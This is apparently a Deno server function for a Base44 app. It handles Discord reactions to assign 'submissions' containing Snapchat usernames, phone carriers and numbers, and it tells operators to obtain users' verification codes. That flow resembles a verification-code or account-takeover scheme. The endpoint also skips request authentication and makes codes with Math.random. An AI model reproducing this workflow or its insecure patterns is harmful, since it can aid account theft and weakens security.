import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get('DISCORD_BOT_TOKEN');
const CHANNEL_ID = Deno.env.get('DISCORD_CHANNEL_ID');

Deno.serve(async (req) => {
  if (req.method !== 'POST') {
    return Response.json({ error: 'Method not allowed' }, { status: 405 });
  }

  try {
    const body = await req.json();

    // Vérifier que c'est une réaction de type reaction_add
    if (body.type !== 'MESSAGE_REACTION_ADD' && !body.emoji) {
      return Response.json({ ok: true });
    }

    const userId = body.user_id;
    const messageId = body.message_id;
    const emoji = body.emoji?.name;

    // Seule la réaction ✅ nous intéresse
    if (emoji !== '✅') {
      return Response.json({ ok: true });
    }

    // Récupérer le message pour obtenir l'embed et la soumission
    const messageRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages/${messageId}`, {
      headers: { 'Authorization': `Bot ${BOT_TOKEN}` }
    });

    if (!messageRes.ok) {
      return Response.json({ ok: true });
    }

    const message = await messageRes.json();
    const messageEmbed = message.embeds?.[0];
    const submissionId = messageEmbed?.footer?.text?.match(/ID: ([a-z0-9]+)/)?.[1];
    const snapchat = messageEmbed?.fields?.find((f: any) => f.name === '👤 Utilisateur')?.value?.replace('@', '') || 'Utilisateur';

    if (!submissionId) {
      return Response.json({ ok: true });
    }

    const base44 = createClientFromRequest(req);
    const submission = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);

    if (!submission) {
      return Response.json({ ok: true });
    }

    // Vérifier si quelqu'un a déjà pris en charge cette soumission
    if (submission.discord_user_id && submission.discord_user_id !== userId) {
      // Quelqu'un d'autre a déjà pris en charge
      return Response.json({ ok: true });
    }

    // Générer un code aléatoire de 6 caractères
    const code = Math.random().toString(36).substring(2, 8).toUpperCase();

    // Mettre à jour la soumission avec le code et l'ID du réacteur
    await base44.asServiceRole.entities.Submission.update(submissionId, {
      code,
      status: 'code_ready',
      discord_user_id: userId,
      code_sent_at: new Date().toISOString()
    });

    // Créer un thread sur le message
    const threadResponse = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages/${messageId}/threads`, {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        name: `✅ Prise en charge — @${snapchat}`,
        auto_archive_duration: 1440
      })
    });

    if (threadResponse.ok) {
      const thread = await threadResponse.json();
      const threadId = thread.id;

      // Sauvegarder l'ID du thread
      await base44.asServiceRole.entities.Submission.update(submissionId, { discord_thread_id: threadId });

      // Ajouter l'utilisateur au thread
      await fetch(`https://discord.com/api/v10/channels/${threadId}/thread_members/${userId}`, {
        method: 'PUT',
        headers: { 'Authorization': `Bot ${BOT_TOKEN}` }
      });

      // Envoyer le message avec les infos dans le thread
      const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
      const triggerUrl = `${appUrl}/?trigger=${submissionId}`;

      const embed = {
        title: "✅ Tu as pris en charge cette soumission",
        color: 3447003,
        fields: [
          { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
          { name: "📡 Opérateur", value: submission.operateur, inline: true },
          { name: "📞 Numéro", value: submission.telephone, inline: true },
          { name: "🔑 Code", value: `\`${code}\``, inline: false },
          {
            name: "📝 Instructions",
            value: `Envoie le code à l'utilisateur et attends qu'il te donne son code de vérification.\n\n[Cliquer ici pour envoyer le code](${triggerUrl})`,
            inline: false
          }
        ]
      };

      await fetch(`https://discord.com/api/v10/channels/${threadId}/messages`, {
        method: 'POST',
        headers: {
          'Authorization': `Bot ${BOT_TOKEN}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ embeds: [embed] })
      });
    }

    return Response.json({ ok: true });
  } catch (error) {
    console.error('Erreur:', error);
    return Response.json({ ok: true });
  }
});